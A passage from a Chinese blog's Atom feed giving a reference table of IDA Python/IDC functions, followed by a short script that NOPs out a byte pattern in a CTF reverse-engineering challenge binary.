地址上的代码引用何处的代码。</td></tr><tr><td>DataRefsTo( long Address )</td><td>返回一个列表，告诉我们 Address 处数据被什么地方引用了。常用于跟踪全局变量。</td></tr><tr><td>DataRefsFrom( long Address )</td><td>返回一个列表，告诉我们 Address 地址上的代码引用何处的数据。</td></tr><tr><td>Heads(start=None, end=None)</td><td>得到两个地址之间所有的元素</td></tr><tr><td>GetDisasm(addr)</td><td>得到addr的反汇编语句</td></tr><tr><td>GetMnem(addr)</td><td>得到addr地址的操作码</td></tr><tr><td>BADADDR</td><td>验证是不是错误地址</td></tr><tr><td>GetOpnd(addr，long n)</td><td>第一个参数是地址，第二个long n是操作数索引。第一个操作数是0和第二个是1。</td></tr><tr><td>idaapi.decode_insn(ea)</td><td>得到当前地址指令的长度</td></tr><tr><td>idc.FindFuncEnd(ea)</td><td>找到当前地址的函数结束地址</td></tr><tr><td>Entries()</td><td>入口点信息</td></tr><tr><td>Structs()</td><td>遍历结构体</td></tr><tr><td>StructMembers(sid)</td><td>遍历结构体成员</td></tr><tr><td>DecodePrecedingInstruction(ea)</td><td>获取指令结构</td></tr><tr><td>DecodePreviousInstruction(ea)</td><td>获取指令结构</td></tr><tr><td>DecodeInstruction(ea)</td><td>获取指令结构</td></tr><tr><td>Strings(object)</td><td>获取字符串</td></tr><tr><td>GetIdbDir()</td><td>获取idb目录</td></tr><tr><td>GetRegisterList()</td><td>获取寄存器名表</td></tr><tr><td>GetInstructionList</td><td>获取汇编指令表</td></tr><tr><td>atoa(ea)</td><td>获取所在段</td></tr><tr><td>Jump(ea)</td><td>移动光标</td></tr><tr><td>Eval(expr)</td><td>计算表达式</td></tr><tr><td>Exec(command)</td><td>执行命令行</td></tr><tr><td>MakeCode(ea)</td><td>分析代码区</td></tr><tr><td>MakeNameEx(ea, name, flags)</td><td>重命名地址</td></tr><tr><td>MakeArray(ea, nitems)</td><td>创建数组</td></tr><tr><td>MakeStr(ea, endea)</td><td>创建字符串</td></tr><tr><td>MakeData(ea, flags, size, tid)</td><td>创建数据</td></tr><tr><td>MakeByte(ea)</td><td></td></tr><tr><td>MakeWord(ea)</td><td></td></tr><tr><td>MakeDWord(ea)</td><td></td></tr><tr><td>MakeQWord(ea)</td><td></td></tr><tr><td>MakeOWord(ea)</td><td></td></tr><tr><td>MakeYWord(ea)</td><td></td></tr><tr><td>MakeFlot(ea)</td><td></td></tr><tr><td>MakeDouble(ea)</td><td></td></tr><tr><td>MakePackReal(ea)</td><td></td></tr><tr><td>MakeTbyte(ea)</td><td></td></tr><tr><td>MakeStructEx(ea)</td><td></td></tr><tr><td>MakeCustomDataEx(ea)</td><td></td></tr><tr><td>PatchByte(ea, value)</td><td>修改程序字节</td></tr><tr><td>PatchWord(ea, value)</td><td>修改程序字</td></tr><tr><td>PatchDword(ea, value)</td><td>修改程序双字</td></tr><tr><td>Byte(ea)</td><td>将地址解释为Byte</td></tr><tr><td>Word(ea)</td><td></td></tr><tr><td>DWord(ea)</td><td></td></tr><tr><td>QWord(ea)</td><td></td></tr><tr><td>GetFloat(ea)</td><td>获取浮点数</td></tr><tr><td>GetDouble(ea)</td><td>获取双精度浮点数</td></tr><tr><td>GetString(ea, length = -1, strtype = ASCSTR_C)</td><td>获取字符串</td></tr><tr><td>GetCurrentLine()</td><td>获取光标所在行反汇编</td></tr><tr><td>ItemSize(ea)</td><td>获取指令或数据长度</td></tr><tr><td>FindText(ea, flag, y, x, searchstr)</td><td>查找文本</td></tr><tr><td>FindBinary(ea, flag, searchstr, radix=16)</td><td>查找16进制</td></tr><tr><td>GetEntryPointQty()</td><td>获取入口点个数</td></tr><tr><td>GetEntryOrdinal(index)</td><td>获取入口点地址</td></tr><tr><td>GetEntryName(ordinal)</td><td>获得入口名</td></tr></tbody></table><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h3 id="xman2019-trydbg-exe"><a href="#xman2019-trydbg-exe" class="headerlink" title="xman2019-trydbg.exe"></a>xman2019-trydbg.exe</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">addr = find_binary(<span class="number">0x140001050</span>, <span class="number">1</span>, <span class="string">'74 12 75 10 4C 7F 53 0C 0C 54 8F C4 28 E9 42 FE FF FF 80 75'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">     ea - address to start from</span></span><br><span class="line"><span class="string">     str - a string as a user enters it for Search Text in Core</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">if</span> addr == BADADDR:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">PatchByte(addr+i, <span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;跟着&lt;a href=&quot;https://lantern.cool/2020/05/05/ida-python/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lantern&lt;/a&gt;学逆向之IDA python:&lt;/p&gt;
&lt;h1 id=&quot;函数表&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="RE" scheme="https://nuoye-blog.github.io/categories/RE/"/>
    
    
      <category term="RE" scheme="https://nuoye-blog.github.io/tags/RE/"/>
    
      <category term="tool" scheme="https://nuoye-blog.github.io/tags/tool/"/>
    
      <category term="python" scheme="https://nuoye-blog.github.io/tags/python/"/>
    
      <category term="ida" scheme="https://nuoye-blog.github.io/tags/ida/"/>
    
  </entry>
  
</feed>
